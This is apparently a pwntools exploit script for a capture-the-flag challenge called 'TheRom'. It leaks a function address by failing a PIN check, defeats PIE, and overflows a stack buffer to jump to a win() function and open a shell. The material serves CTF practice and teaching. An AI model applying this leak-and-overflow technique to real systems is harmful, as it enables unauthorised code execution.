
#
# Exploit for "TheRom" challenge based on the provided decompiled code.
# This script defeats PIE/ASLR by using an information leak to calculate
# the correct addresses at runtime before launching a buffer overflow attack.
#

from pwn import *
import re

# --- Configuration ---

# Set the target host and port from the challenge description
HOST = '10.1.2.228'
PORT = 1337

# Set the context for the exploit (64-bit architecture)
context.update(arch='amd64', os='linux')

# --- Exploit Parameters ---

# Static offsets from the binary's base address, found via decompilation.
# These remain constant even when PIE is enabled.
OFFSET_GET_INPUT = 0x11EF
OFFSET_WIN = 0x11B9
OFFSET_RET = 0x101a # A more reliable ret gadget from the binary

# The offset needed to overwrite the return address on the stack.
# The vulnerable buffer `v1` is located at `rbp - 0x70`.
# The return address is at `rbp + 0x8`.
# The total offset is 0x70 (112) + 8 = 120 bytes.
OFFSET_TO_RIP = 120

# --- Exploit Logic ---

def run_exploit():
    """
    Connects to the target, triggers an info leak to defeat PIE,
    sends the exploit payload, and gets a shell.
    """
    log.info(f"Connecting to {HOST}:{PORT}...")
    try:
        # Establish a connection to the remote service
        p = remote(HOST, PORT)

        # 1. Trigger the information leak
        # By failing the PIN check three times, we force the program to print
        # the runtime address of the `get_input` function.
        log.info("Intentionally failing PIN check 3 times to trigger address leak...")
        for _ in range(3):
            p.recvuntil(b'Enter PIN code: ')
            p.sendline(b'0000') # Send any incorrect PIN

        # 2. Parse the leaked address
        # We must specifically read until the debug message to ensure we don't
        # parse the wrong line (like "Wrong PIN!").
        p.recvuntil(b'[DEBUG] Leak get_input(): ')
        
        # Read the rest of the line, which contains the address.
        leak_line = p.recvline().decode().strip()
        
        # Convert the hexadecimal string to an integer.
        leaked_get_input_addr = int(leak_line, 16)
        log.success(f"Leaked get_input() address: {hex(leaked_get_input_addr)}")

        # 3. Calculate dynamic addresses
        # With the leaked address, we can calculate the binary's base address
        # and then the real addresses of our target function and gadget.
        base_addr = leaked_get_input_addr - OFFSET_GET_INPUT
        win_addr = base_addr + OFFSET_WIN
        ret_addr = base_addr + OFFSET_RET
        log.info(f"Calculated base address: {hex(base_addr)}")
        log.info(f"Calculated win() address: {hex(win_addr)}")
        log.info(f"Calculated ret gadget address: {hex(ret_addr)}")

        # 4. Craft the payload
        # The payload uses the dynamically calculated addresses.
        payload = b'A' * OFFSET_TO_RIP
        payload += p64(ret_addr)    # Align the stack for execve
        payload += p64(win_addr)    # Jump to the win function

        # 5. Send the exploit payload
        p.recvuntil(b'Now give me your final input: ')
        p.sendline(payload)
        log.success("Payload sent successfully!")

        # 6. Interact with the shell
        log.success("Switching to interactive shell...")
        p.interactive()

    except Exception as e:
        log.failure(f"An error occurred: {e}")
        log.info("Please ensure the target is running and accessible.")

if __name__ == "__main__":
    run_exploit()
